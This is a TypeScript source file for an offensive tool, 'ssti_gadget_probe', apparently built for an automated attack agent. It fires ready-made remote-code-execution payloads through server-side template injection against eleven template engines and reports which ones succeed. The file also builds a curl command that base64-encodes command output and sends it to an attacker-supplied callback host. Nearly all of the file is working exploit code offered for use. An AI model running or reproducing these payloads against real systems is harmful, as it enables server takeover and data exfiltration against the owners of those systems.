// T62 — ssti_gadget_probe
// Per-engine RCE gadgets for confirmed SSTI findings.
// Requires ssti_detect to have already identified the template engine.

import { ToolDefinition, ToolResult } from '../types';
import { CommandExecutor } from '../executor';

const definition: ToolDefinition = {
  name: 'ssti_gadget_probe',
  description:
    'SSTI RCE gadget probe. Given a confirmed template injection field and engine, fires the full ' +
    'per-engine RCE gadget chain to achieve OS command execution. Supports: Jinja2, Twig, Freemarker, ' +
    'Velocity, Mako, Thymeleaf, Pebble, Handlebars, Smarty, ERB, SpEL. ' +
    'Confirms execution via OOB DNS callback or inline output.',
  status: 'available',
  version: '1.0.0',
  parameters: [
    { name: 'url',       type: 'string', required: true,  description: 'Target URL' },
    { name: 'method',    type: 'string', required: false, description: 'HTTP method', default: 'GET' },
    { name: 'field',     type: 'string', required: true,  description: 'Vulnerable parameter name' },
    { name: 'engine',    type: 'string', required: false, description: 'Template engine (jinja2/twig/freemarker/velocity/mako/thymeleaf/pebble/handlebars/smarty/erb/spel/auto)', default: 'auto' },
    { name: 'command',   type: 'string', required: false, description: 'OS command to execute', default: 'id' },
    { name: 'oob_host',  type: 'string', required: false, description: 'OOB callback hostname for blind execution' },
    { name: 'headers',   type: 'string', required: false, description: 'JSON extra headers' },
    { name: 'timeout_ms', type: 'number', required: false, description: 'Per-request timeout ms', default: 15000 },
  ],
};

function buildGadgets(engine: string, command: string, oobHost: string): Array<{ name: string; payload: string; blind: boolean }> {
  const oob = oobHost ? `curl http://${oobHost}/$(${command}|base64 -w0)` : command;

  const gadgets: Record<string, Array<{ name: string; payload: string; blind: boolean }>> = {
    jinja2: [
      { name: 'jinja2_subclasses',  payload: `{{''.__class__.__mro__[1].__subclasses__()[408]('${oob}',shell=True,stdout=-1).communicate()[0].strip()}}`, blind: false },
      { name: 'jinja2_config',      payload: `{{config.__class__.__init__.__globals__['os'].popen('${oob}').read()}}`, blind: false },
      { name: 'jinja2_cycler',      payload: `{{cycler.__init__.__globals__.os.popen('${oob}').read()}}`, blind: false },
      { name: 'jinja2_joiner',      payload: `{{joiner.__init__.__globals__.os.popen('${oob}').read()}}`, blind: false },
    ],
    twig: [
      { name: 'twig_filter_rce',    payload: `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("${oob}")}}`, blind: false },
      { name: 'twig_setfilter',     payload: `{%set a%}${oob}{%endset%}{{a|e('html')}}`, blind: false },
      { name: 'twig_block_rce',     payload: `{{"${oob}"|filter("system")}}`, blind: false },
    ],
    freemarker: [
      { name: 'freemarker_exec',    payload: `<#assign ex="freemarker.template.utility.Execute"?new()>${'$'}{ex("${oob}")}`, blind: false },
      { name: 'freemarker_classobj', payload: '${"freemarker.template.utility.Execute"?new()("' + oob + '")}', blind: false },
    ],
    velocity: [
      { name: 'velocity_runtime',   payload: `#set($rt = $class.forName("java.lang.Runtime"))#set($proc = $rt.getRuntime().exec("${oob}"))#set($is = $proc.getInputStream())#set($reader = $class.forName("java.io.InputStreamReader").getDeclaredConstructors()[0].newInstance($is))#set($br = $class.forName("java.io.BufferedReader").getDeclaredConstructors()[0].newInstance($reader))$br.readLine()`, blind: false },
    ],
    mako: [
      { name: 'mako_import',        payload: `<%import os%>${'$'}{os.popen("${oob}").read()}`, blind: false },
      { name: 'mako_module',        payload: `${'$'}{self.module.cache.util.os.system("${oob}")}`, blind: false },
    ],
    thymeleaf: [
      { name: 'thymeleaf_springel', payload: `__${'$'}{T(java.lang.Runtime).getRuntime().exec("${oob}")}__::.x`, blind: true },
      { name: 'thymeleaf_expr',     payload: `[[${'$'}{T(java.lang.Runtime).getRuntime().exec("${oob}")}]]`, blind: true },
    ],
    pebble: [
      { name: 'pebble_class',       payload: `{{''.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'${oob}')}}`, blind: true },
    ],
    handlebars: [
      { name: 'handlebars_proto',   payload: `{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').execSync('${oob}').toString()"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}`, blind: false },
    ],
    smarty: [
      { name: 'smarty_eval',        payload: `{php}echo system('${oob}');{/php}`, blind: false },
      { name: 'smarty_rce',         payload: `{system('${oob}')}`, blind: false },
    ],
    erb: [
      { name: 'erb_backtick',       payload: `<%= \`${oob}\` %>`, blind: false },
      { name: 'erb_system',         payload: `<%= system('${oob}') %>`, blind: false },
    ],
    spel: [
      { name: 'spel_runtime',       payload: `T(java.lang.Runtime).getRuntime().exec('${oob}')`, blind: true },
      { name: 'spel_processbuilder', payload: `new java.lang.ProcessBuilder({'${oob}'}).start()`, blind: true },
    ],
  };

  if (engine === 'auto') {
    // Return one gadget from each engine
    return Object.values(gadgets).map(g => g[0]);
  }
  return gadgets[engine] || gadgets['jinja2'];
}

export const sstiGadgetProbeTool = {
  definition,
  async execute(params: Record<string, unknown>, _exec: CommandExecutor): Promise<ToolResult> {
    const url = String(params.url || '');
    const method = String(params.method || 'GET').toUpperCase();
    const field = String(params.field || '');
    const engine = String(params.engine || 'auto').toLowerCase();
    const command = String(params.command || 'id');
    const oobHost = params.oob_host ? String(params.oob_host) : '';
    const timeoutMs = Number(params.timeout_ms || 15000);

    if (!url) return { output: 'url required', parsed: { error: 'missing_url' } };
    if (!field) return { output: 'field required', parsed: { error: 'missing_field' } };

    let headers: Record<string, string> = { 'User-Agent': 'Mozilla/5.0 GENESIS/4.0' };
    try { if (params.headers) Object.assign(headers, JSON.parse(String(params.headers))); } catch { /* ignore */ }

    const gadgets = buildGadgets(engine, command, oobHost);
    const results: Array<{ name: string; status: number; body: string; interesting: boolean; blind: boolean; error?: string }> = [];

    for (const gadget of gadgets) {
      try {
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), timeoutMs);
        let resp: Response;
        if (method === 'GET') {
          const sep = url.includes('?') ? '&' : '?';
          resp = await fetch(`${url}${sep}${field}=${encodeURIComponent(gadget.payload)}`, { headers, signal: controller.signal });
        } else {
          headers['Content-Type'] = 'application/x-www-form-urlencoded';
          resp = await fetch(url, { method, headers, body: `${field}=${encodeURIComponent(gadget.payload)}`, signal: controller.signal });
        }
        clearTimeout(timer);
        const body = (await resp.text()).substring(0, 300);
        // Interesting: response contains command output, uid=, or oob marker
        const interesting = /uid=\d+|root:|www-data|genesis-clobber/i.test(body) || !!(oobHost && body.includes(oobHost.split('.')[0]));
        results.push({ name: gadget.name, status: resp.status, body, interesting, blind: gadget.blind });
      } catch (err) {
        results.push({ name: gadget.name, status: 0, body: '', interesting: false, blind: gadget.blind, error: String(err) });
      }
    }

    const interesting = results.filter(r => r.interesting);
    const lines = [
      `ssti_gadget_probe — engine=${engine}  command="${command}"  field="${field}"`,
      `Target: ${url.substring(0, 80)}`,
      `RCE confirmed: ${interesting.length}/${results.length}`,
      '─'.repeat(72),
    ];
    for (const r of results) {
      const flag = r.interesting ? '⚡ RCE CONFIRMED' : r.error ? '✗ ERR          ' : '  ·            ';
      lines.push(`  ${flag}  [${r.name.padEnd(22)}]  status=${r.status}${r.interesting ? `  output="${r.body.substring(0, 60)}"` : ''}`);
    }

    return {
      output: lines.join('\n'),
      parsed: { engine, command, total: results.length, interesting_count: interesting.length, interesting, results },
    };
  },
};
